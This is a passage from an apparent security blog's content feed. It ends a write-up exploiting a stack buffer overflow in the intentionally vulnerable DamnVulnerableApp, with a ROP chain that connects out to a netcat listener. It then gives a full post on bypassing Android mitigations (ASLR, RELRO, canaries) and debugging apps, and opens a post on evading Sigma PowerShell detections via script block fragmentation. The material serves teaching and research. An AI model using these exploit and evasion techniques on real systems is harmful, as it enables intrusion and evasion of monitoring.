[ p64(0x2), p64(0x1), p64(0x0) ] ) # Store socket in memory payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x8) payload += gadget_mov_deref_rdi_rax # Construct sockaddr_in payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x10) payload += gadget_pop_rax payload += b\u0026#39;\\x02\\x00\u0026#39; + b\u0026#39;\\x11\\x58\u0026#39; + b\u0026#39;\\x0a\\x00\\x02\\x02\u0026#39; payload += gadget_mov_deref_rdi_rax payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x18) payload += gadget_pop_rax payload += b\u0026#39;\\x00\u0026#39; * 0x8 payload += gadget_mov_deref_rdi_rax # Connect to 10.0.2.2:4440 # rdx = size payload += gadget_pop_rdx payload += b\u0026#39;\\x10\u0026#39; + b\u0026#39;\\x00\u0026#39; * 0x7 # rsi = addr of socketaddr_in payload += gadget_pop_rsi payload += p64(u64(writable_memory) + 0x10) # rdi = sockfd payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x8) payload += gadget_mov_rax_deref_rdi payload += gadget_mov_rdi_rax_pop_rax payload += writable_memory # Call function --\u0026gt; syscall instead of libc call, because this returns errno payload += gadget_pop_rax payload += p64(0x2a) payload += gadget_syscall Lets take a step back and see the individual steps the ROP - chain performs:\ncompute_libc_base computes the base address of libc.so by \u0026ldquo;leaking\u0026rdquo; a libc.so address from .got@libStackBufferOverflowModule.so into a register and writing that address into writable_memory call_libc_function calls socket@libc.so and puts the file descriptor into writable_memory+0x8 Then a structure of type struct sockaddr_in is crafted in global memory and describes where to connect to. Finally connect@syscall is called. At least on my end, calling connect@libc.so caused an error. This might be due to the fact that we wrote into global memory located in libart.so (\u0026hellip; whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did not use a system call to create the socket, as there where no gadgets of the form syscall; ret (or ropper did not tell me). Thus, after the syscall gadget, the behaviour of the app is undefined. To catch the PoC, run the following command on your local machine:\nnc -lvnp 4440 Now one might argue: \u0026ldquo;Why don\u0026rsquo;t we just run a classical execve ROP - chain?\u0026rdquo;.\nThe answer to that lies in the implementation of DamnVulnerableApp. The manager app will clean up the vulnerable process, if the connection between them breaks. Observe that calling execve will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a SIGKILL to the vulnerable app, thus ending its life even before the program to be executed via execve is initialized. As execve does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown execve attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.\nConclusion In summary, the EasyStackBufferOverflowModule can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get arbitrary code execution limited only by the constraints that DamnVulnerableApp (and its permissions and security mechanisms) imposes.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_2/","tags":["Android","Binary Exploitation","JNI","E²VA","Buffer Overflow","Memory Leak"],"title":"E²VA: Stack Buffer Overflow Module (Part 3)"},{"categories":null,"content":"Android Binary Exploitation In this post, we will examine security mechanisms that Android 12 employs in order to make binary exploitation a bit harder. Also, we will discuss how to get to certain information like shared - object files that are necessary for successful exploitation. The latter will be generalized to getting limited source code access to an app given a corresponding .apk file.\nEnvironment Before diving into details, the technical setup has to be clarified. All of the following observations on security mechanisms were encountered on a x86_64 Pixel 3 emulator running Android 12 (build number is SE1A.220203.002.A1 ). When referencing source code from Android Open Source Project (AOSP), it will be w.r.t. Android 12.0.0_r31 . The build variant for damnvulnerableapp is currently only debug. Also there is no GooglePlay enabled as we require root on the device for debugging purposes only.\nIn addition to that, standard compilation configurations of Android Studio are used to construct the app and compile native code. The version of Android Studio is as follows:\nAndroid Studio Dolphin | 2021.3.1 Build #AI-213.7172.25.2113.9014738, built on August 31, 2022 Runtime version: 11.0.13+0-b1751.21-8125866 amd64 VM: OpenJDK 64-Bit Server VM by JetBrains s.r.o. Linux 5.15.0-46-generic GC: G1 Young Generation, G1 Old Generation Memory: 2048M Cores: 12 Registry: external.system.auto.import.disabled=true debugger.watches.in.variables=false ide.text.editor.with.preview.show.floating.toolbar=false Current Desktop: ubuntu:GNOME If your environment differs even in the slightest way, you might need different offsets, addresses etc. to get your exploits to work. Thus, if I presents exploit sketches, do not assume that they work out of the box!\nOverview of Security Mechanisms on Android Next, via a non - exhaustive list of security mechanisms we will dive into the details of how Android makes life of an attacker (a bit) harder. If possible, we will try to figure out a way to bypass each security mechanism through additional assumptions.\nPermissions As usual, an app has certain permissions to access specific data or perform specific actions. E.g. in order to create a connection to a remote host via java.net.Socket , an app has to declare the install - time permission android.permission.INTERNET in its manifest. If a permission is not declared (install - time) or not granted (runtime), then the app will not be able to provide the functionality that needs the respective permission(s).\nContinuing the example above, if we somehow manage to get abitrary code execution inside of an Android app, but the app does not declare android.permission.INTERNET, then we will not be able to create a socket connection to call back to our netcat - listener for a reverse shell.\nPermissions can further be divided into\nInstall - time permissions : System automatically grants these upon installation. These permissions can be further classified into Normal permissions : Allow for access to data and actions beyond the app\u0026rsquo;s sandbox. Signature permissions : Irrelevant for now! Runtime permissions : User will be shown a permission prompt that specifically asks for a potentially dangerous permission. These prompts will be presented only if the app is running/starting. Special permissions : Irrelevant for now! We assume an app that is not even capable of specifying these permissions. Assuming source code access and thus access to AndroidManifest.xml, we can deduce which actions are allowed in our shellcode. Another (naive) assumption is to believe that an app is incapable of adding additional permissions without a user\u0026rsquo;s consent via publicly known means (otherwise this would be a severe security issue). Of couse, our shellcode could try to present the user permission prompts that give us further tools to play with, but this is far from stealthy!\nSummarizing, a shellcode is limited to the app\u0026rsquo;s permissions. Theoretically it is possible for shellcode to request runtime permissions \u0026hellip; at runtime. It would be interesting to see whether it is possible to request install - time permissions at runtime.\nFORTIFY This mechanism adds additional compile - time and/or runtime checks to the C standard library. These are mainly memory - related checks, e.g.\nstruct Foo { int val; struct Foo *next; }; void initFoo(struct Foo *f) { memset(\u0026amp;f, 0, sizeof(struct Foo)); } will not work, because FORTIFY is able to detect the 8 - byte overflow at compile - time (example taken from here ).\nAt compile - time, FORTIFY will block compilation, if it is able to detect a bad call to a standard library function like e.g. memset. If FORTIFY is missing information or is very certain that a call is safe, then FORTIFY will be not be part of the process image. Finally, if there is a call, but FORTIFY is not sure whether the call is safe or not, it will redirect the call to a special FORTIFY\u0026rsquo;ed version of the called function, which applies additional checks to ensure correct usage of the function.\nLets consider an Android - related example of the function memset :\n__BIONIC_FORTIFY_INLINE void* memset(void* const s __pass_object_size0, int c, size_t n) __overloadable /* If you\u0026#39;re a user who wants this warning to go away: use `(\u0026amp;memset)(foo, bar, baz)`. */ __clang_warning_if(c \u0026amp;\u0026amp; !n, \u0026#34;\u0026#39;memset\u0026#39; will set 0 bytes; maybe the arguments got flipped?\u0026#34;) { #if __ANDROID_API__ \u0026gt;= 17 \u0026amp;\u0026amp; __BIONIC_FORTIFY_RUNTIME_CHECKS_ENABLED return __builtin___memset_chk(s, c, n, __bos0(s)); #else return __builtin_memset(s, c, n); #endif } As these are builtins, they are implemented by the compiler and thus pretty hard to track down (if you are interested, consider code that looks like a compile - time check and a runtime - check ; no guarantees that these references are what is actually being called!).\nSooo\u0026hellip;how to break it? Apparently, if FORTIFY is lacking information, it will just give up. The developers gave a pretty nice example for FORTIFY\u0026rsquo;s limitations:\n__attribute__((noinline)) // Tell the compiler to never inline this function. inline void intToStr(int i, char *asStr) { sprintf(asStr, \u0026#34;%d\u0026#34;, i); } char *intToDupedStr(int i) { const int MAX_INT_STR_SIZE = sizeof(\u0026#34;2147483648\u0026#34;); // MAX_INT_STR_SIZE = 11 = 10 + 1 char buf[MAX_INT_STR_SIZE]; intToStr(i, buf); return strdup(buf); } Setting i = -2147483648 (which is 0x80000000, because of 2\u0026rsquo;s - complement for 4 - byte values) would result in an off - by - one bug, because buf is a buffer of 11 elements, the last of which is supposed to be a null - terminator. Because sprintf will also put a - sign into buf, the null - terminator will be moved back by one and therefore overwrite the least - significant byte of the next qword on the stack. If rbp was modified, then this would most likely crash the entire program. FORTIFY does not catch this bug, because from the perspective of intToStr, FORTIFY cannot \u0026ldquo;see\u0026rdquo; the allocation of buf. Neither can FORTIFY determine for sure the size of a char*, which could be of arbitrary length, nor can it determine where buf is pointing to (stack, heap, .bss, .data, \u0026hellip;).\nObserve that FORTIFY makes it significantly harder for developers to write vulnerable code. Still, if developers decide to implement their own versions of e.g. memcpy this fully bypasses FORTIFY. Also, as can be seen in the above example, there are settings, in which FORTIFY cannot help, i.e. e.g. if the allocation of a buffer takes place in a different function and this buffer is passed as a type*.\nOn defeating PIEs When building native apps on Android via Android Studio, we will almost always use cmake\u0026rsquo;s add_library with the SHARED flag. This will encapsulate the native code into a lib\u0026lt;somename\u0026gt;.so file, which is actually a shared - object file (ELF ). According to documentation , for such SHARED libraries the property POSITION_INDEPENDENT_CODE is automatically set to ON, thus resulting in Position - Independent - Executables (PIEs; To be precise with terminology, the shared - object file contains Position - Independent - Code (PIC). From ELF\u0026rsquo;s perspective, not every shared - object file is an executable and vice versa).\nWhen calling System.loadLibrary(\u0026quot;xyz\u0026quot;), we can trace down the call hierarchy to versions of dlopen , which is implemented in the linker . Finally, ReserveWithAlignmentPadding will be called, which returns a randomized base address . This confirms that when loading native shared - object files, they will have ASLR enabled by default.\nDefeating ASLR is thus key to handling binary exploitation in PIEs. This can be archieved in numerous ways. The following is a non - exhaustive list of possible ways to break ASLR:\nLeaking an address from e.g. a code region. It seems that the random shift used for the stack (and heap etc.) and a loaded shared - object file differ. This follows from the randomized base address , which is different on each execution of ReserveWithAlignmentPadding. Abusing a side channel that allows for brute - forcing / leaking bytes of an address one by one instead of being forced into brute - forcing / leaking the entire address at once. From ReserveWithAlignmentPadding , by probing for accessible memory mappings. Depending on the app, we might be able to even distinguish different kinds of errors / signals when accessing / returning to invalid memory. However, for memory probing to work the process should not crash upon signals like SIGSEG or SIGILL, which is very rare. Full RELRO With the above security mechanisms in place, it would still be \u0026ldquo;easy\u0026rdquo; to abuse a leak combined with a Write - What - Where condition, as e.g. .got is still writable. E.g. overwriting a .got entry of strlen that is given a string of our choice could result in a redirection to system (for a more detailed discussion, see this blog post ). This is, among other things, prevented by full / partial Relocations Read - Only, i.e. full / partial RELRO, which can be enabled on Android. Full RELRO marks certain memory regions, like e.g. .got, as read - only after program startup. It seems that it is enabled by default, when creating a new native android app in Android Studio.\nNow the question arises, how this mitigation can be circumvented. This again depends on the app. Lets consider the non - exhaustive list:\nGiven a Write - What - Where condition and knowledge on all addresses: Try to find and overwrite a global variable (located in .bss or .data) that impacts the control flow, e.g. a function pointer. Overwrite the return address on the stack to return to a ROP - chain located \u0026ldquo;somewhere else\u0026rdquo;. Given access to mprotect: Call mprotect on .got to make it writable again. Non - executable Stack (and Heap) As has been the case for decades, the stack and heap is marked as non - executable by default. Thus, calling your classical NOP - sledge for help won\u0026rsquo;t do any good.\n(Un-)fortunately, the stack and heap can be used to store gadgets for a ROP - chain.\nCanaries and cookies Depending on how a native function is implemented and compiled, it can be given a stack canary. This canary aims to protect the stack frame, i.e. the return address and stored rbp, from potential buffer overflows on the stack. In our case, this canary is an 8 - byte random value that is very hard to predict. Doing the math reveals that we have a 1/(2^64) chance to hit the correct canary. This is why we often assume that there is some kind of leak that (partially) reveals the canary (bytes). Naturally, two approaches come to mind when thinking of \u0026ldquo;leaking an 8 byte random value\u0026rdquo;:\nReading it directly from the stack. Trivially, this will reveal the value.\nBrute - forcing it via a side channel. The side channel could be e.g. an oracle that either says\n\u0026ldquo;Canary is correct\u0026rdquo;, i.e. process keeps running \u0026ldquo;Canary is incorrect\u0026rdquo;, i.e. process crashes. If we overwrite just the least - significant byte of the canary, this byte will be in either of the above categories. If the process does not crash, we can continue with the next canary byte until all 8 bytes are leaked.\nSo, why would the latter approach work? The canary will be consisting of 8 random bytes for each process start, right? Right? No! Not going into the details , the underlying syscall fork, which is used to spawn damnvulnerableapp and its subprocess that is running the vulnerable module, will be called from the same parent process (zygote) over and over again, i.e. for each app. Therefore, apps contain large duplicated memory regions, canary included.\nGetting the source And now for something completely different. Well, technically speaking it is not that different, because packing the source code could be considered a form of obfuscation, which again could be considered a security precaution. Now we will take the perspective of an attacker that tries to get access to the source code of an app while only having access to an app\u0026rsquo;s apk file.\nFinding the apk file There are numerous ways to get an apk file of an app, among which the following seem to be the easiest ones:\nUse Android Studio to build the app and search for the apk file in the directory tree of the app. This implies source code access and therefore makes analyzing an apk file obsolete, but it is a way. Assuming root access on an Android device / emulator, user - installed apps can be found at e.g. /data/app/. There can be a corresponding .apk file to grab for further static analysis (this might depend on the Android version). Unpacking apk files Assuming we grabbed ourselves an apk file, we can start analyzing it:\n$ file base.apk base.apk: Zip archive data, at least v?[0] to extract $ unzip base.apk -d ./base ... $ ls base AndroidManifest.xml classes10.dex classes11.dex classes2.dex classes3.dex classes4.dex classes5.dex classes6.dex classes7.dex classes8.dex classes9.dex classes.dex lib META-INF res resources.arsc Going from here we can easily access the native libraries that are part of the app:\n$ ls base/lib/x86_64 libDoubleFreeModule.so libEasyStackBufferOverflowModule.so libHeapOverflowModule.so libOffByOneModule.so libStackBufferOverflowModule.so libUseAfterFreeExecModule.so libUseAfterFreeWriteModule.so These shared - object files can later be used for finding gadgets and so on. Further they can be analyzed / decompiled via e.g. Ghidra . The decompiled code of logMessage#libOffByOneModule.so could look like this:\nundefined8 Java_com_damnvulnerableapp_vulnerable_modules_OffByOneModule_logMessage (long *param_1,undefined8 param_2,undefined8 param_3) { int iVar1; undefined4 uVar2; undefined8 uVar3; void *pvVar4; undefined8 uVar5; long in_FS_OFFSET; int local_cc; undefined8 local_a0; timespec local_28; undefined local_11; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); uVar3 = (**(code **)(*param_1 + 0x5c0))(param_1,param_3,\u0026amp;local_11); DAT_00103028 = DAT_00103028 + 1; DAT_00103020 = realloc(DAT_00103020,DAT_00103028 * 0x108); if (DAT_00103020 == (void *)0x0) { local_a0 = 0; } else { pvVar4 = (void *)((long)DAT_00103020 + (DAT_00103028 + -1) * 0x108); __memset_chk(pvVar4,0,0x108,0xffffffffffffffff); __memcpy_chk((long)pvVar4 + 0x100,\u0026amp;PTR_FUN_00103010,8,0xffffffffffffffff); local_cc = (**(code **)(*param_1 + 0x558))(param_1,param_3); if (0x100 \u0026lt; local_cc + -1) { local_cc = 0xff; } __memcpy_chk(pvVar4,uVar3,(long)local_cc,0xffffffffffffffff); iVar1 = clock_gettime(0,\u0026amp;local_28); if (iVar1 != -1) { local_28.tv_nsec = local_28.tv_nsec + 10; } uVar5 = (**(code **)((long)pvVar4 + 0x100))(pvVar4,(long)local_cc); uVar2 = __strlen_chk(uVar5,0xffffffffffffffff); local_a0 = (**(code **)(*param_1 + 0x580))(param_1,uVar2); (**(code **)(*param_1 + 0x680))(param_1,local_a0,0,uVar2,uVar5); (**(code **)(*param_1 + 0x600))(param_1,param_3,uVar3,2); } if (*(long *)(in_FS_OFFSET + 0x28) == local_10) { return local_a0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } In order to not being forced into manually setting up the jni type definitions, see either jni_all.h or jni_all.h . When in the CodeBrowser, try running File -\u0026gt; Parse C Source\u0026hellip;, add the corresponding file to \u0026ldquo;Source files to parse\u0026rdquo;, choose the correct base profile (\u0026ldquo;parse configuration\u0026rdquo;) and set the parse options to e.g. this .\nTo be more precise, first download any of the above mentioned jni_all.h files. Then open File -\u0026gt; Parse C Source\u0026hellip;. You should be prompted with the following window: Next, choose an existing profile as a base profile. E.g. choose generic_clib_32.prf and click on the Save profile to new name button (upper right corner). Then choose a name that you recognize: After giving the new profile a nice name, we need to adjust the parse options. E.g. you can copy them over from here . Do not overwrite -I options: Finally, add jni_all.h to the Source files to parse panel by clicking on the green plus sign to the right. This should open files. Navigate to jni_all.h and open it. You should see a new entry if you scrolled all the way down. Now click the Save profile button at the top and then Parse to program at the bottom. If you now retype a variable, e.g. the first argument of a JNI function to JNIEnv*, you will see actual function names like NewByteArray etc.\nNow we are just missing the Java code that calls this native function\u0026hellip;\nGetting Java code In order to obtain the Java code of an app, an attacker could utilize a tool like jadx . This basically reconstructs the project structure we see in Android Studio:\n$ jadx-gui ./base.apk ... This decompiles a large portion of the app. Continuing the example of the OffByOneModule, we can get the following decompiled code for the OffByOneModule class:\npackage com.damnvulnerableapp.vulnerable.modules; import com.damnvulnerableapp.common.exceptions.VulnerableModuleException; /* loaded from: classes10.dex */ public class OffByOneModule extends VulnerableModule { private static native byte[] logMessage(byte[] bArr); static { System.loadLibrary(\u0026#34;OffByOneModule\u0026#34;); } public OffByOneModule() { super(new OffByOneModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Welcome to the most secure message logger in the world!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Enter a message to log: \u0026#34;.getBytes()); byte[] message = input(); if (message == null) { output(\u0026#34;Failed to receive the message to log...Better safe than sorry!\u0026#34;.getBytes()); } else if (new String(message).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Your logged message(s) were stored successfully.\u0026#34;.getBytes()); return; } else { output(logMessage(message)); } } } } Grabbing System Libraries Often there are libraries, of which we have a leaked pointer. Having such a pointer is nice and all, but it will not help, if we do not have access to the corresponding shared - object file. Lets try to get access to libart.so, the android runtime that runs the Java code we wrote for the app. Among other things, it handles native calls via trampoline functions like art_quick_generic_jni_trampoline .\nIn order to find libart.so, again assuming root access, running the damnvulnerableapp reveals the binary that underlies the process:\n# ps -e | grep damn u0_a107 4122 357 13798620 114268 do_epoll_wait 0 S com.damnvulnerableapp # file /proc/4122/exe /proc/4122/exe: symbolic link to /system/bin/app_process64 # readelf -d /system/bin/app_process64 ... 0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so] 0x0000000000000001 (NEEDED) Shared library: [libbinder.so] 0x0000000000000001 (NEEDED) Shared library: [libcutils.so] 0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so] 0x0000000000000001 (NEEDED) Shared library: [liblog.so] 0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so] 0x0000000000000001 (NEEDED) Shared library: [libsigchain.so] 0x0000000000000001 (NEEDED) Shared library: [libutils.so] 0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so] 0x0000000000000001 (NEEDED) Shared library: [libc++.so] 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] ... This means that libart.so will be loaded later on, i.e. not at startup. Further analysis reveals:\n# cat /proc/4122/maps | grep libart.so 730c03400000-730c0357b000 r--p 00000000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0377a000-730c03e0b000 r-xp 0017a000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0400a000-730c0401d000 r--p 0080a000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0421c000-730c04220000 rw-p 0081c000 fe:0f 57 /apex/com.android.art/lib64/libart.so # exit $ adb pull /apex/com.android.art/lib64/libart.so ./libart.so After the above commands, libart.so should be in our current working directory, ready to be analyzed via Ghidra, objdump (which will most likely not work, because objdump does not recognize the architecture) or readelf .\nThere may be two unexpected aspects:\nEven if you do not have root access on the emulator, it is possible to run adb pull \u0026lt;from remote\u0026gt; \u0026lt;to local\u0026gt;. We only used root to access /proc/4122/maps etc. The name of the binary that underlies damnvulnerableapp is /system/bin/app_process64. To that end, observe that Java apps are forked from the zygote process . The zygote process, among other things, initializes the JVM to allow for faster app starts. Analysing the Stack Trace There is one more thing to consider. When given a leak, e.g. an address from the stack, then it is important to (partially) understand what values are located on the stack. To that end, one may write a small native app via Android Studio, set a breakpoint on the native function and run the app. This could result in the following stack trace:\nJava_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper EasyStackBufferOverflowModule.c:32 art_quick_generic_jni_trampoline 0x000071636dba032c art_quick_invoke_stub 0x000071636db95015 art::ArtMethod::Invoke(art::Thread *, unsigned int *, unsigned int, art::JValue *, const char *) 0x000071636dc1d9fb art::interpreter::ArtInterpreterToCompiledCodeBridge(art::Thread *, art::ArtMethod *, art::ShadowFrame *, unsigned short, art::JValue *) 0x000071636dda335d art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d16d art::interpreter::ExecuteSwitchImplCpp\u0026lt;…\u0026gt;(art::interpreter::SwitchImplContext *) 0x000071636dbac1d0 ExecuteSwitchImplAsm 0x000071636dba23d6 art::interpreter::ExecuteSwitch(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool) 0x000071636dd9ca6e art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94ae1 art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeVirtual 0x000071636e16e306 mterp_op_invoke_virtual 0x000071636db7e71a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeVirtual 0x000071636e16e306 mterp_op_invoke_virtual 0x000071636db7e71a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeInterface 0x000071636e175bfd mterp_op_invoke_interface 0x000071636db7e91a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 artQuickToInterpreterBridge 0x000071636e159a70 art_quick_to_interpreter_bridge 0x000071636dba04bd \u0026lt;unknown\u0026gt; 0x000071636dba07c0 This is a stack - trace of a module that will be exploited in a later post. The most important address is the return address of Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper, i.e the address into art_quick_generic_jni_trampoline: 0x000071636dba032c. Depending on whether the native method is e.g. declared as static or not, different stubs are called, which may result in different return addresses. Thus it might be beneficial to produce a small sample app with the same setup as the target app, especially w.r.t. access modifiers etc. of the native method, to get an idea of the stack - trace.\nDebugging on Android Another very important aspect of binary exploitation is debugging. There are a lot of good resources out there (like 1 , 2 ). One possible debugger is GDB . As GDB by itself is pretty hard to use, I will use an extensions in this series, called GEF . A prerequisite is that we have root access on the device/emulator.\nStarting an app from terminal In order to debug an app, the app needs to run. In this case, as we are using a \u0026ldquo;special\u0026rdquo; app, we just need to run it without waiting for a debugger to attach. Running an app can be done as follows:\n$ adb shell \u0026#34;am start -n com.damnvulnerableapp/com.damnvulnerableapp.managerservice.ManagerActivity\u0026#34; Here we assume that the app of choice is the DamnVulnerableApp, which is the main focus of this series.\nFrom here onwards, the manager will run in the background and wait for incoming connections. Once a connection is established, the messages will be used to tell the manager what to do, like spawning a vulnerable module.\nStarting an exploit script Assuming that connecting to a socket server is not a great challenge, right after the connection has been established and a vulnerable module selected, the exploit script should wait for the debugger to attach. This can be achieved like demonstrated in the following:\n# Need tcp forward, i.e. \u0026#39;adb forward tcp:8080 tcp:8080\u0026#39; client = PwnClient(\u0026#39;127.0.0.1\u0026#39;, 8080) client.select(\u0026#39;EasyStackBufferOverflowModule\u0026#39;) print(client.fetch()) input(\u0026#39;Press \u0026lt;enter\u0026gt; to continue...\u0026#39;) ... This is not the clean way, but it works just fine.\nAttaching gdb Notice that selecting a module should spawn a new process that encapsulates the vulnerable module. Now we need a gdbserver, which is part of the Android NDK . Uploading the gdbserver to e.g. /data/local/tmp/gdbserver will enable us to attach to running processes. The command history could look like this:\n$ adb push gdbserver /data/local/tmp/gdbserver $ adb shell \u0026#34;chmod 777 /data/local/tmp/gdbserver\u0026#34; $ adb forward tcp:1337 tcp:1337 $ adb shell \u0026#34;/data/local/tmp/gdbserver :1337 --attach $(pidof com.damnvulnerableapp:VulnerableActivity)\u0026#34; ... Listening on port 1337 We will make gdb connect to port 1337 for debugging. After the last command, the process will block until a debugger connects. Before that, we should provide gdb with all necessary symbol information that is helpful for debugging. Namely (inspired from here ):\n$ mkdir ~/dbgtmp $ adb pull /system/lib64 ~/dbgtmp $ mkdir ~/dbgtmp/tmp $ adb pull /apex/com.android.art/lib64 ~/dbgtmp/tmp $ mv ~/dbgtmp/tmp/* ~/dbgtmp/lib64 $ cp ~/path/to/unpacked/apk/lib/x86_64/* ~/dbgtmp/lib64 Then, in gdb/gef (taken from here and here ):\ngef➤ set solib-absolute-prefix ~/dbgtmp/ gef➤ set solib-search-path ~/dbgtmp/lib64/ gef➤ gef-remote :1337 ... [+] Connected to \u0026#39;:1337\u0026#39; [+] Remote information loaded to temporary path \u0026#39;/tmp/gef/6695\u0026#39; gef➤ sharedlibrary ... The last command will take ages to run, but its worth as we get access to almost all symbols we need (there is most likely a better way to do this). Basically we just need to do this once with all the libraries, then identify the libraries we are interested in and create a directory next to lib64 on our local machine that only contains this interesting subset of the shared - object files. This will speed up loading time by a lot!\nSummary We have seen some security mechanisms that will make the life of an attacker harder. Depending on the assumptions, like e.g. leaking an address, some mechanisms can be rendered useless. Also, we are now able to get limited source code access and debug Android apps using gdb. This will allow us to exploit the available modules in damnvulnerableapp.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_1/","tags":["Android","Binary Exploitation","JNI","E²VA"],"title":"E²VA: Android Basics (Part 2)"},{"categories":null,"content":"PowerView is evil, but PowerVi and ew are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation Update [15/08/2024]: In a short discussion on X the source code of the PowerShell Script Block Fragmentation was linked . Looking at the comment in the code, it becomes clear that the size of a script block fragment is intentionally set to a random value in order to deny attackers the easy possibility to split their scripts as they wish. If a script block is larger than 20000 (Unicode) characters, it is split into fragments with sizes 10000 plus a random value between 0 and 10000 - resulting in script block sizes from 10000 to 20000 characters. Further research is needed to answer the question if and how the fragmentation of PowerShell script blocks can still be exploited.\nTL;DR: Sigma rules and similar signature-based threat detection measures may miss malicious PowerShell scripts due to unpredictable fragmentation of script block logs.\nIntroduction Sigma offers more than 3000 rules for signature-based threat detection. 140 of these rules aim to detect suspicious/malicious PowerShell scripts by looking into PowerShell script block logs. Fragmentation of script blocks during Script Block Logging results in varying number of alerts when loading the same script multiple times. On the one hand, there is a trend of more alerts being generated when the script is split into more fragments (which is fine), but on the other hand, the fragmentation of scripts into blocks may result in missed detections.\nI know this is a lot, but bear with me as I tell you the whole story. If you are only interested in the juicy part, you can skip to \u0026lsquo;The case of split \u0026ldquo;PowerVi/ew\u0026rdquo;\u0026rsquo;.\nThe Uncertainty of Script Block Logging It is known that when loading a very large script, PowerShell breaks it into multiple parts before logging them - sometimes resulting in dozens of fragments. To illustrate this behavior, we loaded the well-known PowerView script a total of 10 times (on the same machine and configuration) and recorded into how many block fragments it was broken. The results are shown in the table below.\nRun 1 2 3 4 5 6 7 8 9 10 # Blocks 54 76 57 49 64 57 55 69 39 47 We can see that the number of blocks ranges from 39 to 76, which is quite a significant difference.\nMore script blocks -\u0026gt; More alerts? Now, when using Sigma rules that operate on single logged ScriptBlockTexts, the number of generated alerts might differ because the number of logged blocks differs. More specific, the number of generated alerts usually increases with increasing number of blocks, because the malicious/suspicious strings were found in more blocks. Using \u0026ldquo;all rules\u0026rdquo; from Sigma release r2024-03-11 and the 10 recorded PowerView loadings, the following number of alerts were generated using Chainsaw (sorted by number of blocks).\nBlocks 39 47 49 54 55 57 57 64 69 76 Alarms 79 91 94 103 99 106 107 110 119 126 \u0026hellip; raised on \u0026hellip; blocks 39 46 48 53 53 56 56 60 65 70 Here, we see that the number of alarms usually increases with the number of blocks - that is the expected behavior. The only run that does not match this trend is the one that generated 55 script blocks. Here, less alerts are generated than in the run generating 54 script blocks. Although this behavior leads to inconsistency, it can be considered \u0026ldquo;not too bad\u0026rdquo; since in some cases more alerts are generated than in other cases, but overall we still catch everything, right?\nMore script blocks -\u0026gt; Less alerts?? To investigate how the number of blocks influences the number of generated alerts, we further looked into the generated alarms. Below, the number of generated alerts for each triggered rule is listed for each of the 10 runs.\nRule / Run#Blocks 9#39 10#47 4#49 1#54 7#55 3#57 6#57 5#64 8#69 2#76 AVG Total 79 91 94 103 99 106 107 110 119 126 103.4 Execute Invoke-command on Remote Host 5 6 6 6 6 7 6 [2] 7 7 7 6.3 Malicious PowerShell Commandlets - ScriptBlock 35 42 43 49 46 51 51 53 58 61 48.9 Malicious PowerShell Keywords 3 2 2 2 2 2 3 2 3 2 2.3 Manipulation of User Computer or Group Security Principals Across AD 4 4 4 6 [3] 4 4 